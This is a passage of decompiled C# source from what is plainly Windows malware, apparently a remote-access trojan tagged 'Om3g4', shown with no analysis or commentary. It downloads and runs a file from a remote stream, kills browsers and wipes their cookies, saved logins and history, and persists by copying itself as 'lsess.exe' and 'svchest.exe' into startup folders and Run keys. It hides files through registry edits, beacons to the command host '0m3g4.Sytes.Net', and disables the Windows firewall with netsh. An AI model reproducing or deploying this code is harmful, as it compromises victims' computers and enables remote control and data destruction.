			if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists(text))
			{
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(text);
			}
			int num = 0;
			FileStream fileStream = new FileStream(text, FileMode.OpenOrCreate, FileAccess.Write);
			int target = default(int);
			while (InlineAssignHelper(ref target, HQ.GetStream().Read(array, 0, array.Length)) > 0)
			{
				fileStream.Write(array, 0, target);
				num = checked(num + target);
			}
			fileStream.Close();
			Thread.Sleep(5000);
			Process.Start(text);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void PowerModeChanged(object sender, PowerModeChangedEventArgs e)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		//IL_0009: Expected I4, but got Unknown
		switch (e.get_Mode() - 1)
		{
		case 0:
			Victim_Online();
			break;
		case 2:
			ProjectData.EndApp();
			break;
		case 1:
			break;
		}
	}

	private void SessionEnding(object sender, SessionEndingEventArgs e)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		//IL_0009: Expected I4, but got Unknown
		switch (e.get_Reason() - 1)
		{
		case 0:
			ProjectData.EndApp();
			break;
		case 1:
			ProjectData.EndApp();
			break;
		}
	}

	private void Clear_Internet_Data()
	{
		KillProcesses(InternetExplorer: true, Firefox: true, Opera: true, Safari: true, Chrome: true);
		DeleteGoogleChromeData(Enable: true);
		DeleteMozillaSqlite(Enable: true);
		DeleteFlashPlayerCookies(Enable: true);
		DeleteOperaUserData(Enable: true);
		DeleteSafariUserData(Enable: true);
		DeleteIEHistory(Enable: true);
		DeleteIECookies(Enable: true);
		DeleteIECache(Enable: true);
		DeleteWinRecent(Enable: true);
		DeleteWinTemp(Enable: true);
		DeleteWinIcoCache(Enable: true);
		DeleteMozillaCache(Enable: true);
		DeleteMozillaCookies(Enable: true);
		DeleteMozillaSignons(Enable: true);
		Clear_All(Enable: true);
	}

	[DllImport("shell32.dll")]
	private static extern bool SHGetSpecialFolderPath(IntPtr hwndOwner, [Out] StringBuilder lpszPath, int nFolder, bool fCreate);

	public void KillProcesses(bool InternetExplorer, bool Firefox, bool Opera, bool Safari, bool Chrome)
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			if (Firefox)
			{
				if (process.MainWindowTitle.Contains("Mozilla Firefox"))
				{
					process.Kill();
				}
				else if (Operators.CompareString(process.ProcessName, "firefox", false) == 0)
				{
					process.Kill();
				}
				else if (Operators.CompareString(process.ProcessName, "Firefox", false) == 0)
				{
					process.Kill();
				}
			}
			if (InternetExplorer)
			{
				if (process.MainWindowTitle.Contains("Internet Explorer"))
				{
					process.Kill();
				}
				else if (Operators.CompareString(process.ProcessName, "iexplore", false) == 0)
				{
					process.Kill();
				}
				else if (Operators.CompareString(process.ProcessName, "Iexplore", false) == 0)
				{
					process.Kill();
				}
			}
			if (Opera)
			{
				if (process.MainWindowTitle.Contains("Opera"))
				{
					process.Kill();
				}
				else if (Operators.CompareString(process.ProcessName, "opera", false) == 0)
				{
					process.Kill();
				}
				else if (Operators.CompareString(process.ProcessName, "Opera", false) == 0)
				{
					process.Kill();
				}
			}
			if (Safari)
			{
				if (process.MainWindowTitle.Contains("Safari"))
				{
					process.Kill();
				}
				else if (Operators.CompareString(process.ProcessName, "Safari", false) == 0)
				{
					process.Kill();
				}
				else if (Operators.CompareString(process.ProcessName, "safari", false) == 0)
				{
					process.Kill();
				}
			}
			if (Chrome)
			{
				if (process.MainWindowTitle.Contains("Chrome"))
				{
					process.Kill();
				}
				else if (Operators.CompareString(process.ProcessName, "chrome", false) == 0)
				{
					process.Kill();
				}
				else if (Operators.CompareString(process.ProcessName, "Chrome", false) == 0)
				{
					process.Kill();
				}
			}
		}
	}

	public void DeleteIEHistory(bool Enable)
	{
		if (!Enable)
		{
			return;
		}
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.History);
		if (!Directory.Exists(folderPath))
		{
			return;
		}
		foreach (string file in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(folderPath))
		{
			try
			{
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(file);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	public void DeleteIECookies(bool Enable)
	{
		if (!Enable)
		{
			return;
		}
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Cookies);
		if (!Directory.Exists(folderPath))
		{
			return;
		}
		foreach (string file in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(folderPath))
		{
			try
			{
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(file);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	public void DeleteIECache(bool Enable)
	{
		if (!Enable)
		{
			return;
		}
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.InternetCache);
		if (Directory.Exists(folderPath + "\\Content.IE5"))
		{
			foreach (string file in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(folderPath + "\\Content.IE5"))
			{
				try
				{
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(file);
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
		}
		foreach (string directory in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories(folderPath))
		{
			try
			{
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteDirectory(directory, (DeleteDirectoryOption)5);
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
		}
	}

	public void DeleteWinRecent(bool Enable)
	{
		if (!Enable)
		{
			return;
		}
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Recent);
		foreach (string file in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(folderPath))
		{
			try
			{
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(file);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	public void DeleteWinTemp(bool Enable)
	{
		if (!Enable)
		{
			return;
		}
		string text = Environment.GetFolderPath(Environment.SpecialFolder.InternetCache).Remove(Environment.GetFolderPath(Environment.SpecialFolder.InternetCache).LastIndexOf("\\"));
		if (!Directory.Exists(text))
		{
			return;
		}
		foreach (string directory in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories(text))
		{
			if (directory.Substring(checked(directory.LastIndexOf("\\") + 1)).StartsWith("App"))
			{
				continue;
			}
			foreach (string file in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(directory))
			{
				try
				{
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(file);
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
			foreach (string directory2 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories(directory))
			{
				try
				{
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteDirectory(directory2, (DeleteDirectoryOption)5);
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
				}
			}
			try
			{
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteDirectory(directory, (DeleteDirectoryOption)5);
				((ServerComputer)MyProject.Computer).get_FileSystem().CreateDirectory(directory);
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
			}
		}
	}

	public void DeleteWinIcoCache(bool Enable)
	{
		if (Enable)
		{
			SHGetSpecialFolderPath(IntPtr.Zero, path, 28, fCreate: false);
			string text = path.ToString();
			try
			{
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(text + "\\IconCache.db");
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	[DllImport("shell32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int SHEmptyRecycleBinA(int hWnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string pszRootPath, int dwFlags);

	[DllImport("shell32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int SHUpdateRecycleBinIcon();

	private void DeleteWinRecycleBin(bool Enable)
	{
		if (Enable)
		{
			int hWnd = ((Control)this).get_Handle().ToInt32();
			string pszRootPath = null;
			SHEmptyRecycleBinA(hWnd, ref pszRootPath, 7);
			SHUpdateRecycleBinIcon();
		}
	}

	public void DeleteMozillaCookies(bool Enable)
	{
		if (!Enable)
		{
			return;
		}
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Mozilla\\Firefox\\Profiles";
		if (!Directory.Exists(text))
		{
			return;
		}
		foreach (string directory in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories(text))
		{
			foreach (string file in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(directory))
			{
				if (file.Contains("cookie"))
				{
					try
					{
						((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(file);
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
				}
			}
		}
	}

	public void DeleteMozillaCache(bool Enable)
	{
		if (!Enable)
		{
			return;
		}
		string text = ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_Temp()
			.Remove(((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_Temp()
				.LastIndexOf("\\"));
		if (!Directory.Exists(text))
		{
			return;
		}
		foreach (string directory in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories(text))
		{
			foreach (string file in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(directory))
			{
				try
				{
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(file);
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
		}
	}

	public void DeleteMozillaSignons(bool Enable)
	{
		if (!Enable)
		{
			return;
		}
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Mozilla\\Firefox\\Profiles";
		if (!Directory.Exists(text))
		{
			return;
		}
		foreach (string directory in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories(text))
		{
			foreach (string file in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(directory))
			{
				if (file.Contains("signon"))
				{
					try
					{
						((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(file);
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
				}
			}
		}
	}

	public void DeleteMozillaSqlite(bool Enable)
	{
		if (!Enable)
		{
			return;
		}
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Mozilla\\Firefox\\Profiles";
		if (!Directory.Exists(text))
		{
			return;
		}
		foreach (string directory in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories(text))
		{
			foreach (string file in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(directory))
			{
				if (file.Contains("sqlite"))
				{
					try
					{
						((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(file);
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
				}
			}
		}
	}

	public void DeleteGoogleChromeData(bool Enable)
	{
		if (!Enable)
		{
			return;
		}
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
		if (!Directory.Exists(folderPath + "\\Google\\Chrome\\User Data"))
		{
			return;
		}
		foreach (string file in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(folderPath + "\\Google\\Chrome\\User Data"))
		{
			try
			{
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(file);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
		foreach (string directory in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories(folderPath + "\\Google\\Chrome\\User Data"))
		{
			try
			{
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteDirectory(directory, (DeleteDirectoryOption)5);
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
		}
	}

	public void DeleteFlashPlayerCookies(bool Enable)
	{
		if (!Enable)
		{
			return;
		}
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		if (!Directory.Exists(folderPath + "\\Macromedia"))
		{
			return;
		}
		foreach (string directory in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories(folderPath + "\\Macromedia"))
		{
			try
			{
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteDirectory(directory, (DeleteDirectoryOption)5);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	public void DeleteOperaUserData(bool Enable)
	{
		if (!Enable)
		{
			return;
		}
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		if (!Directory.Exists(folderPath + "\\Opera"))
		{
			return;
		}
		foreach (string directory in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories(folderPath + "\\Opera"))
		{
			try
			{
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteDirectory(directory, (DeleteDirectoryOption)5);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	public void DeleteSafariUserData(bool Enable)
	{
		if (!Enable)
		{
			return;
		}
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		if (!Directory.Exists(folderPath + "\\Apple Computer\\Safari"))
		{
			return;
		}
		foreach (string file in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(folderPath + "\\Apple Computer\\Safari"))
		{
			try
			{
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(file);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
		foreach (string directory in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories(folderPath + "\\Apple Computer\\Safari"))
		{
			try
			{
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteDirectory(directory, (DeleteDirectoryOption)5);
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
		}
	}

	public void Clear_All(bool Enable)
	{
		if (Enable)
		{
			try
			{
				Process process = new Process();
				string fileName = "RunDll32.exe";
				process.StartInfo.Arguments = "InetCpl.cpl,ClearMyTracksByProcess 4351";
				process.StartInfo.FileName = fileName;
				process.StartInfo.UseShellExecute = false;
				process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				process.StartInfo.CreateNoWindow = true;
				process.Start();
				process.WaitForExit();
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			try
			{
				Process process2 = new Process();
				string fileName2 = "netsh.exe";
				process2.StartInfo.Arguments = "interface ip delete arpcache";
				process2.StartInfo.FileName = fileName2;
				process2.StartInfo.UseShellExecute = false;
				process2.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				process2.StartInfo.CreateNoWindow = true;
				process2.Start();
				process2.WaitForExit();
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
			try
			{
				Process process3 = new Process();
				string fileName3 = "ipconfig.exe";
				process3.StartInfo.Arguments = "/flushdns";
				process3.StartInfo.FileName = fileName3;
				process3.StartInfo.UseShellExecute = false;
				process3.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				process3.StartInfo.CreateNoWindow = true;
				process3.Start();
				process3.WaitForExit();
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
			}
		}
	}

	private void AddToStartup()
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		string value = default(string);
		string value2 = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0009;
				case 691:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0001;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0009;
						case 3:
							goto IL_002c;
						case 4:
							goto IL_0040;
						case 6:
							goto IL_0058;
						case 7:
							goto IL_007b;
						case 9:
							goto IL_0091;
						case 10:
							goto IL_00b5;
						case 11:
							goto IL_00ca;
						case 5:
						case 8:
						case 12:
						case 13:
							goto IL_00df;
						case 14:
							goto IL_0104;
						case 15:
						case 16:
							goto IL_011d;
						case 17:
							goto IL_0146;
						case 18:
							goto IL_0160;
						case 19:
							goto IL_0189;
						case 20:
							goto IL_01b2;
						case 21:
							goto IL_01d5;
						case 22:
							goto IL_01f8;
						case 23:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 24:
							goto end_IL_0001_3;
						}
						goto default;
					}
					IL_01f8:
					num = 22;
					((ServerComputer)MyProject.Computer).get_Registry().SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "SuperHidden", (object)"0", RegistryValueKind.DWord);
					break;
					IL_01d5:
					num = 21;
					((ServerComputer)MyProject.Computer).get_Registry().SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "ShowSuperHidden", (object)"0", RegistryValueKind.DWord);
					goto IL_01f8;
					IL_0009:
					num = 2;
					if (((ServerComputer)MyProject.Computer).get_Info().get_OSFullName().ToString()
						.Contains("XP"))
					{
						goto IL_002c;
					}
					goto IL_0058;
					IL_002c:
					num = 3;
					value = FilesFolder + "\\lsess.exe";
					goto IL_0040;
					IL_0040:
					num = 4;
					value2 = Environment.SystemDirectory + "\\svchest.exe";
					goto IL_00df;
					IL_0058:
					num = 6;
					if (((ServerComputer)MyProject.Computer).get_Info().get_OSFullName().ToString()
						.Contains("Vista"))
					{
						goto IL_007b;
					}
					goto IL_0091;
					IL_007b:
					num = 7;
					value = FilesFolder + "\\lsess.exe";
					goto IL_00df;
					IL_0091:
					num = 9;
					if (((ServerComputer)MyProject.Computer).get_Info().get_OSFullName().ToString()
						.Contains("7"))
					{
						goto IL_00b5;
					}
					goto IL_00df;
					IL_00b5:
					num = 10;
					value = FilesFolder + "\\lsess.exe";
					goto IL_00ca;
					IL_00ca:
					num = 11;
					value2 = RootFolder + "ProgramData\\Microsoft\\DeviceSync\\svchest.exe";
					goto IL_00df;
					IL_00df:
					num = 13;
					if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists(StartupFolder + "\\lsess.exe"))
					{
						goto IL_0104;
					}
					goto IL_011d;
					IL_0104:
					num = 14;
					File.Delete(StartupFolder + "\\lsess.exe");
					goto IL_011d;
					IL_011d:
					num = 16;
					((ServerComputer)MyProject.Computer).get_FileSystem().CopyFile(Application.get_ExecutablePath(), StartupFolder + "\\lsess.exe", true);
					goto IL_0146;
					IL_0146:
					num = 17;
					FileSystem.SetAttr(StartupFolder + "\\lsess.exe", (FileAttribute)2);
					goto IL_0160;
					IL_0160:
					num = 18;
					((ServerComputer)MyProject.Computer).get_Registry().get_LocalMachine().OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.SetValue("svcfile", value2);
					goto IL_0189;
					IL_0189:
					num = 19;
					((ServerComputer)MyProject.Computer).get_Registry().get_CurrentUser().OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.SetValue("sysfile", value);
					goto IL_01b2;
					IL_01b2:
					num = 20;
					((ServerComputer)MyProject.Computer).get_Registry().SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "HideFileExt", (object)"1", RegistryValueKind.DWord);
					goto IL_01d5;
					end_IL_0001_2:
					break;
				}
				num = 23;
				((ServerComputer)MyProject.Computer).get_Registry().SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "Hidden", (object)"2", RegistryValueKind.DWord);
				break;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 691;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private bool chkExistence()
	{
		string text = (string)Registry.GetValue("HKEY_CURRENT_USER\\SOFTWARE\\Om3g4", "Om3g4D", "");
		if (Operators.CompareString(text, "Om3g4D", false) == 0)
		{
			return true;
		}
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software", writable: true);
		RegistryKey registryKey2 = registryKey.CreateSubKey("Om3g4");
		registryKey2.SetValue("Om3g4D", "Om3g4D");
		registryKey2.SetValue("CurrentVersion", MyVer);
		return false;
	}

	private void chkInternet()
	{
		if (((ServerComputer)MyProject.Computer).get_Network().Ping(pingsite))
		{
			NetworkConnectivity = Conversions.ToString(true);
		}
		else
		{
			NetworkConnectivity = Conversions.ToString(false);
		}
		try
		{
			if (Conversions.ToBoolean(NetworkConnectivity) && Operators.CompareString(MyExtIP, (string)null, false) == 0)
			{
				MyExtIP = Encoding.ASCII.GetString(WC.DownloadData("http://whatismyip.org"));
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			if (Conversions.ToBoolean(NetworkConnectivity) && ((Operators.CompareString(MyExtIP, (string)null, false) == 0) | MyExtIP.Contains("://")))
			{
				MyExtIP = Encoding.ASCII.GetString(WC.DownloadData("http://automation.whatismyip.com/n09230945.asp"));
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		try
		{
			if (Conversions.ToBoolean(NetworkConnectivity) && ((Operators.CompareString(MyExtIP, (string)null, false) == 0) | MyExtIP.Contains("://")))
			{
				MyExtIP = Encoding.ASCII.GetString(WC.DownloadData("http://icanhazip.com"));
			}
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
		try
		{
			if (Conversions.ToBoolean(NetworkConnectivity) && ((Operators.CompareString(MyExtIP, (string)null, false) == 0) | MyExtIP.Contains("://")))
			{
				MyExtIP = Encoding.ASCII.GetString(WC.DownloadData("http://myip.dnsomatic.com"));
			}
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			ProjectData.ClearProjectError();
		}
		if (!Conversions.ToBoolean(NetworkConnectivity))
		{
			RemoteNotifier = InternalNotifier;
		}
		if (Conversions.ToBoolean(NetworkConnectivity))
		{
			RemoteNotifier = ExternalNotifier;
		}
		if (!Conversions.ToBoolean(NetworkConnectivity))
		{
			IP = MyIntIP;
		}
		if (Conversions.ToBoolean(NetworkConnectivity))
		{
			IP = MyExtIP;
		}
		if (Conversions.ToBoolean(NetworkConnectivity))
		{
			Dns2IP("0m3g4.Sytes.Net");
		}
		if (File.Exists(TempFolder + "\\nonet.txt"))
		{
			string text = ((ServerComputer)MyProject.Computer).get_FileSystem().ReadAllText(TempFolder + "\\nonet.txt");
			if (text.Contains("Email"))
			{
				FirstTimeNotify();
			}
		}
	}

	private void Dns2IP(string Site)
	{
		try
		{
			IPHostEntry hostEntry = Dns.GetHostEntry(Site);
			IPAddress[] addressList = hostEntry.AddressList;
			RemoteNotifier = Convert.ToString(addressList[0]);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void Leave_Home()
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		FileInfo fileInfo = default(FileInfo);
		string fileName = default(string);
		Process process = default(Process);
		Process process2 = default(Process);
		string fileName2 = default(string);
		string text = default(string);
		string text2 = default(string);
		DriveInfo[] drives = default(DriveInfo[]);
		DriveInfo[] array = default(DriveInfo[]);
		int num5 = default(int);
		DriveInfo driveInfo = default(DriveInfo);
		FileStream stream = default(FileStream);
		StreamWriter streamWriter = default(StreamWriter);
		FileStream stream2 = default(FileStream);
		StreamWriter streamWriter2 = default(StreamWriter);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_000a;
				case 2635:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0001;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_000a;
						case 3:
							goto IL_0013;
						case 4:
							goto IL_001c;
						case 5:
							goto IL_003f;
						case 7:
							goto IL_0054;
						case 8:
							goto IL_0096;
						case 6:
						case 9:
						case 10:
							goto IL_00a9;
						case 11:
							goto IL_00b9;
						case 12:
							goto IL_00c9;
						case 13:
							goto IL_00d9;
						case 14:
							goto IL_00e9;
						case 15:
							goto IL_00f4;
						case 16:
							goto IL_00fe;
						case 18:
						case 19:
							goto IL_0150;
						case 20:
							goto IL_0164;
						case 21:
							goto IL_0174;
						case 22:
						case 23:
							goto IL_0184;
						case 24:
							goto IL_0198;
						case 25:
						case 26:
							goto IL_01a8;
						case 27:
							goto IL_01bc;
						case 28:
						case 29:
							goto IL_01cc;
						case 30:
							goto IL_01e0;
						case 31:
						case 32:
							goto IL_01f0;
						case 33:
							goto IL_0204;
						case 34:
						case 35:
							goto IL_0214;
						case 36:
							goto IL_0228;
						case 37:
						case 38:
							goto IL_0238;
						case 39:
							goto IL_0256;
						case 40:
							goto IL_027f;
						case 41:
						case 42:
							goto IL_02a8;
						case 43:
							goto IL_02cc;
						case 44:
							goto IL_02e2;
						case 46:
							goto IL_02fc;
						case 47:
							goto IL_0320;
						case 49:
							goto IL_0338;
						case 50:
							goto IL_035c;
						case 51:
							goto IL_0372;
						case 45:
						case 48:
						case 52:
						case 53:
							goto IL_0388;
						case 54:
							goto IL_0392;
						case 55:
							goto IL_03b0;
						case 56:
							goto IL_03dd;
						case 57:
							goto IL_03f0;
						case 58:
							goto IL_040d;
						case 59:
							goto IL_041a;
						case 60:
							goto IL_0435;
						case 61:
							goto IL_0445;
						case 62:
							goto IL_0455;
						case 63:
							goto IL_0465;
						case 64:
							goto IL_0475;
						case 65:
							goto IL_0485;
						case 66:
							goto IL_0495;
						case 67:
							goto IL_04a5;
						case 68:
							goto IL_04b5;
						case 69:
							goto IL_04c5;
						case 70:
							goto IL_04d5;
						case 71:
							goto IL_04e5;
						case 72:
							goto IL_0529;
						case 73:
							goto IL_0539;
						case 74:
							goto IL_057d;
						case 75:
							goto IL_058d;
						case 76:
							goto IL_05a4;
						case 77:
							goto IL_05b4;
						case 79:
							goto IL_05c4;
						case 80:
							goto IL_05c8;
						case 81:
							goto IL_05e5;
						case 82:
							goto IL_05f2;
						case 83:
							goto IL_060d;
						case 84:
							goto IL_061d;
						case 85:
							goto IL_062d;
						case 86:
							goto IL_063d;
						case 87:
							goto IL_064d;
						case 88:
							goto IL_065d;
						case 89:
							goto IL_066d;
						case 90:
							goto IL_067d;
						case 91:
							goto IL_068d;
						case 92:
							goto IL_069d;
						case 93:
							goto IL_06ad;
						case 94:
							goto IL_06bd;
						case 95:
							goto IL_0701;
						case 96:
							goto IL_0711;
						case 97:
							goto IL_0755;
						case 98:
							goto IL_0765;
						case 99:
							goto IL_0784;
						case 100:
							goto IL_0794;
						case 101:
							goto IL_07ab;
						case 102:
							goto IL_07bb;
						case 105:
							goto IL_07c8;
						case 78:
						case 103:
						case 104:
							goto IL_07d1;
						case 106:
							goto IL_07d9;
						case 107:
							goto IL_07e4;
						case 108:
							goto IL_07fa;
						case 109:
							goto IL_080c;
						case 110:
							goto IL_081d;
						case 111:
							goto IL_082e;
						case 112:
							goto IL_083a;
						case 113:
							goto IL_0845;
						case 114:
							goto IL_0851;
						case 115:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 17:
						case 116:
							goto end_IL_0001_3;
						}
						goto default;
					}
					IL_0845:
					num = 113;
					fileInfo = new FileInfo(fileName);
					goto IL_0851;
					IL_083a:
					num = 112;
					process.WaitForExit();
					goto IL_0845;
					IL_000a:
					num = 2;
					process2 = new Process();
					goto IL_0013;
					IL_0013:
					num = 3;
					fileName2 = "netsh.exe";
					goto IL_001c;
					IL_001c:
					num = 4;
					if (((ServerComputer)MyProject.Computer).get_Info().get_OSFullName().ToString()
						.Contains("XP"))
					{
						goto IL_003f;
					}
					goto IL_0054;
					IL_003f:
					num = 5;
					process2.StartInfo.Arguments = "firewall set opmode disable";
					goto IL_00a9;
					IL_0054:
					num = 7;
					if (((ServerComputer)MyProject.Computer).get_Info().get_OSFullName().ToString()
						.Contains("Vista") | ((ServerComputer)MyProject.Computer).get_Info().get_OSFullName().ToString()
						.Contains("7"))
					{
						goto IL_0096;
					}
					goto IL_00a9;
					IL_0096:
